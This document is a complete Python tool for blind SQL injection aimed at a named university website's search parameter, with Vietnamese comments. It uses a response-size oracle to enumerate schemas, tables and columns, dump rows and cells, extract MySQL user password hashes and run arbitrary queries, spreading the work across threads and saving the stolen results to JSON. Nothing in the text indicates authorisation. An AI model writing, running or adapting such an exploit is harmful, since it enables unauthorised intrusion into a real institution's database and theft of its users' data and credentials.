#!/usr/bin/env python3
"""Multi-mode blind SQLi (content oracle) extractor for uef.edu.vn txtSearch.

Oracle: payload the0"XOR(if(EXPR,1,0))XOR"Z  ->  TRUE ~82KB / FALSE 71052 bytes.
Cung co che voi sqli_enum2/3: do dai bang CHAR_LENGTH, lay ky tu bang ASCII(SUBSTRING),
verify lai bang BINARY (...)=..., luu JSON sau moi muc.

Cach dung: python3 sqli_ext_uef.py <mode> [tham so]
  tables  <schema> [start=0] [end=80] [workers=6]     liet ke bang cua 1 schema (append, resume duoc)
  columns <table> [max_cols=30] [workers=6]           cot cua 1 bang (schema hien tai; "db.table" neu khac)
  colscan [regex] [workers=6] [max_cols=30]           cot cua cac bang trong /tmp/sqli_enum_uef.json (resume)
  count   <table>                                     so dong cua bang
  rows    <table> [n=3] [start=0] [workers=6] [maxlen=192]   lay n dong dau (CONCAT_WS '|')
  cell    <table> <cot> <offset> [workers=6] [maxlen=256]      1 o du lieu (cot x, dong y)
  hashes  [workers=6]                                 password hash cua mysql.user (user, host, password)
  sql     "<SELECT..." [maxlen=128] [workers=6]       1 gia tri tuy y (nhac truy van trong ngoac kep)

Ket qua: /tmp/sqli_ext_uef.json  |  Log: /tmp/sqli_enum_uef.log
"""
import sys, time, json, threading, urllib.parse, http.client, ssl, re
from concurrent.futures import ThreadPoolExecutor

HOST = "www.uef.edu.vn"
PATH = "/thu-vien-hinh-anh?Trang_1&txtSearch="
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
THRESH = 75000
LOG = "/tmp/sqli_enum_uef.log"
JSONF = "/tmp/sqli_ext_uef.json"
ENUMJSON = "/tmp/sqli_enum_uef.json"
lock = threading.Lock()
stats = {"req": 0, "false_streak": 0}
cache = {}
_ctx = ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode = ssl.CERT_NONE
_local = threading.local()
IDENT = re.compile(r"^[A-Za-z0-9_]+$")


def log(msg):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), msg)
    print(line, flush=True)
    with lock:
        with open(LOG, "a") as f:
            f.write(line + "\n")


def get_conn():
    c = getattr(_local, "conn", None)
    if c is None:
        c = http.client.HTTPSConnection(HOST, timeout=30, context=_ctx)
        _local.conn = c
    return c


def http_size(q):
    payload = 'the0"XOR(if(%s,1,0))XOR"Z' % q
    url = PATH + urllib.parse.quote(payload, safe="")
    for attempt in range(3):
        try:
            c = get_conn()
            c.request("GET", url, headers={"User-Agent": UA, "Accept": "*/*"})
            r = c.getresponse()
            body = r.read()
            with lock:
                stats["req"] += 1
            if r.status == 200:
                return len(body)
            log("HTTP %d, retry" % r.status)
            _local.conn = None
        except Exception as e:
            _local.conn = None
            if attempt == 2:
                log("HTTP_ERR %r expr=%s..." % (e, q[:60]))
    return None


def ask(expr):
    with lock:
        if expr in cache:
            return cache[expr]
    size = http_size(expr)
    if size is None:
        return False  # loi mang: coi nhu FALSE, khong cache
    res = size >= THRESH
    with lock:
        cache[expr] = res
        stats["false_streak"] = stats["false_streak"] + 1 if not res else 0
        streak = stats["false_streak"]
    if streak >= 12:
        log("WARN 12 FALSE lien tiep - health check")
        h = http_size("1=1")
        if h is not None and h < THRESH:
            log("FATAL oracle broken: 1=1 -> %d bytes" % h)
            sys.exit(2)
        with lock:
            stats["false_streak"] = 0
        time.sleep(5)
    return res


def get_len(expr, maxlen=96):
    lo, hi = 0, maxlen
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("CHAR_LENGTH((%s))>%d" % (expr, mid)):
            lo = mid + 1
        else:
            hi = mid
    return lo


def get_char(expr, pos):
    lo, hi = 0, 127
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("ASCII(SUBSTRING((%s),%d,1))>%d" % (expr, pos, mid)):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo) if lo else ""


def extract(expr, label, workers=6, maxlen=96):
    n = get_len(expr, maxlen)
    if n <= 0:
        log("%s: EMPTY (NULL/rong)" % label)
        return ""
    chars = [""] * n
    with ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(get_char, expr, p + 1): p for p in range(n)}
        for f, p in futs.items():
            chars[p] = f.result()
    s = "".join(chars)
    if n >= maxlen:
        log("%s = %r (TRUNCATED, len>=%d, req=%d)" % (label, s, maxlen, stats["req"]))
        return s + "...[TRUNCATED?]"
    esc = s.replace("\\", "\\\\").replace("'", "\\'")
    ok = ask("BINARY (%s)='%s'" % (expr, esc))
    log("%s = %r (verify=%s, len=%d, req=%d)" % (label, s, ok, n, stats["req"]))
    return s if ok else s + "...[VERIFY_FAILED]"


def num(expr, maxval=512):
    lo, hi = 0, maxval
    while lo < hi:
        mid = (lo + hi) // 2
        if ask("(%s)>%d" % (expr, mid)):
            lo = mid + 1
        else:
            hi = mid
    log("COUNT %s = %d" % (expr, lo))
    return lo


def load(p=JSONF):
    try:
        with open(p) as f:
            return json.load(f)
    except Exception:
        return {}


def save(d, p=JSONF):
    with open(p, "w") as f:
        json.dump(d, f, indent=1, ensure_ascii=False)


def ident(s, what):
    if not IDENT.match(s or ""):
        log("FATAL identifier khong hop le: %r (%s)" % (s, what))
        sys.exit(2)
    return s


def split_table(arg):
    if "." in arg:
        s, t = arg.split(".", 1)
        ident(s, "schema")
        ident(t, "table")
        return "table_schema='%s'" % s, "%s.%s" % (s, t)
    ident(arg, "table")
    return "table_schema=database()", arg


def base_table(arg):
    return arg.split(".", 1)[1] if "." in arg else arg


def get_columns(table, where, workers, max_cols=30):
    d = load()
    key = "columns[%s]" % table
    if d.get(key, {}).get("cols"):
        return d[key]["cols"]
    t = base_table(table)
    c = num("SELECT COUNT(*) FROM information_schema.columns WHERE %s AND table_name='%s'" % (where, t), 128)
    cols = []
    for i in range(min(c, max_cols)):
        cols.append(extract("SELECT column_name FROM information_schema.columns WHERE %s AND table_name='%s' ORDER BY ordinal_position LIMIT %d,1" % (where, t, i), "col[%s][%d]" % (t, i), workers, 64))
    d[key] = {"n": c, "cols": cols}
    save(d)
    return cols


def mode_tables(schema, start, end, workers):
    ident(schema, "schema")
    d = load()
    key = "tables[%s]" % schema
    lst = d.get(key, [])
    n = num("SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='%s'" % schema, 512)
    log("SCHEMA %s: %d bang, lay %d..%d" % (schema, n, start, min(end, n)))
    for i in range(start, min(end, n)):
        t = extract("SELECT table_name FROM information_schema.tables WHERE table_schema='%s' ORDER BY table_name LIMIT %d,1" % (schema, i), "tbl[%s][%d]" % (schema, i), workers, 64)
        lst.append(t)
        d[key] = lst
        save(d)


def mode_columns(table, max_cols, workers):
    where, frm = split_table(table)
    cols = get_columns(table, where, workers, max_cols)
    log("COLUMNS %s: %s" % (table, cols))


def mode_colscan(regex, workers, max_cols):
    d = load()
    e = load(ENUMJSON)
    raw = [t for t in e.get("tables", []) if t and "VERIFY_FAILED" not in t]
    seen = set()
    ordered = [t for t in raw if not (t in seen or seen.add(t))]
    pat = re.compile(regex, re.I) if regex else None
    targets = [t for t in ordered if pat is None or pat.search(t)]
    log("COLSCAN: %d/%d bang (regex=%r)" % (len(targets), len(ordered), regex))
    done = 0
    for t in targets:
        key = "columns[%s]" % t
        if d.get(key, {}).get("cols"):
            continue
        mode_columns(t, max_cols, workers)
        d = load()
        done += 1
    log("COLSCAN DONE: %d bang moi, tong cot da co: %d" % (done, len([k for k in d if k.startswith("columns[")])))


def mode_count(table):
    where, frm = split_table(table)
    n = num("SELECT COUNT(*) FROM %s" % frm, 1000000)
    d = load()
    d["count[%s]" % table] = n
    save(d)


def mode_rows(table, n_rows, start, workers, maxlen):
    where, frm = split_table(table)
    cols = [c for c in get_columns(table, where, workers) if c and IDENT.match(c) and "VERIFY_FAILED" not in c]
    if not cols:
        log("FATAL khong co cot hop le cho %s" % table)
        sys.exit(2)
    n = num("SELECT COUNT(*) FROM %s" % frm, 1000000)
    log("ROWS %s: count=%d, cot=%s" % (table, n, cols))
    d = load()
    key = "data[%s]" % table
    data = d.get(key, [])
    sel = ",".join("IFNULL(%s,'~NULL~')" % c for c in cols)
    endi = min(start + n_rows, n)
    for i in range(start, endi):
        v = extract("SELECT CONCAT_WS('|',%s) FROM %s LIMIT %d,1" % (sel, frm, i), "row[%s][%d]" % (table, i), workers, maxlen)
        data.append({"idx": i, "raw": v})
        d[key] = data
        save(d)


def mode_cell(table, column, offset, workers, maxlen):
    ident(column, "column")
    where, frm = split_table(table)
    v = extract("SELECT %s FROM %s LIMIT %d,1" % (column, frm, offset), "cell[%s.%s][%d]" % (table, column, offset), workers, maxlen)
    d = load()
    d.setdefault("cells", []).append({"table": table, "column": column, "offset": offset, "value": v})
    save(d)


def mode_hashes(workers):
    n = num("SELECT COUNT(*) FROM mysql.user", 64)
    d = load()
    rows = d.get("mysql_hashes", [])
    empties = 0
    for i in range(len(rows), min(n, 10)):
        u = extract("SELECT user FROM mysql.user ORDER BY user,host LIMIT %d,1" % i, "h.u[%d]" % i, workers, 48)
        h = extract("SELECT host FROM mysql.user ORDER BY user,host LIMIT %d,1" % i, "h.h[%d]" % i, workers, 48)
        p = extract("SELECT password FROM mysql.user ORDER BY user,host LIMIT %d,1" % i, "h.p[%d]" % i, workers, 64)
        if not p:
            empties += 1
        rows.append({"idx": i, "user": u, "host": h, "password": p})
        d["mysql_hashes"] = rows
        save(d)
    if empties:
        log("NOTE %d hash rong - neu tat ca rong, thu cot authentication_string thay password" % empties)


def mode_sql(expr, maxlen, workers):
    v = extract(expr, "sql", workers, maxlen)
    d = load()
    d.setdefault("sql_results", []).append({"expr": expr, "value": v})
    save(d)


USAGE = """Cach dung: python3 sqli_ext_uef.py <mode> [tham so]
  tables  <schema> [start=0] [end=80] [workers=6]
  columns <table> [max_cols=30] [workers=6]
  colscan [regex] [workers=6] [max_cols=30]
  count   <table>
  rows    <table> [n=3] [start=0] [workers=6] [maxlen=192]
  cell    <table> <cot> <offset> [workers=6] [maxlen=256]
  hashes  [workers=6]
  sql     "<SELECT..." [maxlen=128] [workers=6]
Ket qua: /tmp/sqli_ext_uef.json | Log: /tmp/sqli_enum_uef.log"""


def main():
    a = sys.argv[1:]
    if not a:
        print(USAGE)
        sys.exit(1)
    m = a[0]
    t0 = time.time()
    log("=== EXT %s START ===" % m)
    if m == "tables":
        mode_tables(a[1], int(a[2]) if len(a) > 2 else 0, int(a[3]) if len(a) > 3 else 80, int(a[4]) if len(a) > 4 else 6)
    elif m == "columns":
        mode_columns(a[1], int(a[2]) if len(a) > 2 else 30, int(a[3]) if len(a) > 3 else 6)
    elif m == "colscan":
        mode_colscan(a[1] if len(a) > 1 else "", int(a[2]) if len(a) > 2 else 6, int(a[3]) if len(a) > 3 else 30)
    elif m == "count":
        mode_count(a[1])
    elif m == "rows":
        mode_rows(a[1], int(a[2]) if len(a) > 2 else 3, int(a[3]) if len(a) > 3 else 0, int(a[4]) if len(a) > 4 else 6, int(a[5]) if len(a) > 5 else 192)
    elif m == "cell":
        mode_cell(a[1], a[2], int(a[3]), int(a[4]) if len(a) > 4 else 6, int(a[5]) if len(a) > 5 else 256)
    elif m == "hashes":
        mode_hashes(int(a[1]) if len(a) > 1 else 6)
    elif m == "sql":
        mode_sql(a[1] if len(a) > 1 else "SELECT 1", int(a[2]) if len(a) > 2 else 128, int(a[3]) if len(a) > 3 else 6)
    else:
        print(USAGE)
        sys.exit(1)
    log("=== EXT %s DONE in %.0fs, req=%d ===" % (m, time.time() - t0, stats["req"]))


if __name__ == "__main__":
    main()
